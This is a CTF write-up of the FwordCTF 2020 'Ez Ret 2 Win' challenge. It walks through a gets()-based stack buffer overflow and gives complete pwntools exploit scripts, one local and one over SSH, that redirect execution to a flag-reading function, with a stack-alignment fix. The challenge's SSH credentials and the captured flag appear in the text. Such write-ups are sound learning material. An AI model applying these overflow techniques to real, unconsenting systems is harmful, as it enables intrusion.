# FwordCTF 2020

## Ez Ret 2 Win ? (postmortem)

> 499  
>  
> Is it really an easy Ret2Win ? i just couldn't exploit it :'(  
> **PS: Task is not broken ,this is the intended behaviour of the binary.**  
> SSH Credentials:  
> `ssh -p 2222 [email protected]`  
> Password: `FwOrDAndKahl4FTW`  
>  
> Author: KAHLA  
>  
> [`superez`](superez)

Tags: _pwn_ _x86-64_ _bof_ _ret2win_ _ssh_

## Summary

This _is_ a stupid _easy_ _ret2win_ that worked locally, but not remotely (via
ssh).  After reading a writeup, I was just _off by one_.  Kinda pissed.

Hat tip again to [po6ix](https://gist.github.com/po6ix/) for their
[writeup](https://gist.github.com/po6ix/31a1ed1b033b1ab23541c84e83de448d#file-
ez-ret-to-win-py)

The key is here from po6ix:

```  
# payload += p64(0x400917)  
payload += p64(0x400918)  
```

+1.  Goddamnit.

## Analysis

### Checksec

```  
   Arch:     amd64-64-little  
   RELRO:    Partial RELRO  
   Stack:    No canary found  
   NX:       NX enabled  
   PIE:      No PIE (0x400000)  
```

The title indicate this is _ret2win_, so assume we just need to BOF and
_ret2win_.

### Decompile with Ghidra

```c  
 if (__fd == 0) {  
   printf("Enter Your password to continue: ");  
   gets(local_a8);  
   printf("you typed \'%s\', Good Bye!\n",local_a8);  
```

From `main` above, `gets` is the vulnerability.  And the buffer is `0xa8`
bytes from the return address.

```c  
undefined8 rasengan(void)  
{  
 int iVar1;  
 FILE *__stream;  
  
 __stream = fopen("flag.txt","r");  
 if (__stream == (FILE *)0x0) {  
   perror("flag.txt not found! If this happened in the server contact the
author please!");  
                   /* WARNING: Subroutine does not return */  
   exit(1);  
 }  
 while( true ) {  
   iVar1 = fgetc(__stream);  
   if ((char)iVar1 == -1) break;  
   putchar((int)(char)iVar1);  
 }  
 fclose(__stream);  
 return 0;  
}  
```  

Here is our `win` function.  Easy, right?

## Exploit

### Local Test

```  
#!/usr/bin/env python

from pwn import *

binary = context.binary = ELF('./superez')  
context.log_level = 'DEBUG'  
context.log_file = 'foo.log'

p = process(binary.path, stdin=PTY, raw=True)  
p.recvuntil('Enter Your password to continue:')  
payload  = 0xa8 * b'A'  
payload += p64(binary.sym.rasengan)  
p.sendline(payload)  
p.interactive()  
```

This worked perfectly.

### Remote Test

```  
#!/usr/bin/env python

from pwn import *

binary = context.binary = ELF('./superez')  
context.log_level = 'INFO'  
context.log_file = 'log.log'

s =
ssh(host='superez.fword.wtf',user='ctf',port=2222,password='FwOrDAndKahl4FTW')  
p = s.run('/bin/bash')  
p.recvuntil('/home/user1$')  
p.sendline('./task')

p.recvuntil('Enter Your password to continue:')  
payload  = 0xa8 * b'A'  
payload += p64(binary.sym.rasengan)  
p.sendline(payload)  
p.interactive()  
```

This did _NOT_ work.  I wasted all my time thinking it was something with ssh
and some of the `termios` shitfuckery in `main`.

In hindsight I should have just checked out the libc version on the remote
server, or just blindly tested:

`payload += p64(binary.sym.rasengan + 1)`

`+ 1`, there it is again.  I know better.  I should have known [stack
alignment](https://blog.binpang.me/2019/07/12/stack-alignment/) could be a
potential issue and testing with +1 could have been a lazy check.  Jesus, I
already dealt with this twice in this CTF.

Fuck me.

Output:

```  
# ./exploit.py  
[*] '/pwd/datajerk/fwordctf2020/ezret2win/superez'  
   Arch:     amd64-64-little  
   RELRO:    Partial RELRO  
   Stack:    No canary found  
   NX:       NX enabled  
   PIE:      No PIE (0x400000)  
[+] Connecting to superez.fword.wtf on port 2222: Done  
[*] [email protected]:  
   Distro    Unknown Unknown  
   OS:       Unknown  
   Arch:     Unknown  
   Version:  0.0.0  
   ASLR:     Disabled  
   Note:     Susceptible to ASLR ulimit trick (CVE-2016-3672)  
[+] Opening new channel: '/bin/bash': Done  
[*] Switching to interactive mode

you typed
'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x18@',
Good Bye!  
FwordCTF{CVE-2019-18634_Is_L33t_BuT_1SnT_It_E4Sy_Ret2Win?}  
Segmentation fault (core dumped)  
```  

Original writeup (https://github.com/datajerk/ctf-write-
ups/tree/master/fwordctf2020/ezret2win).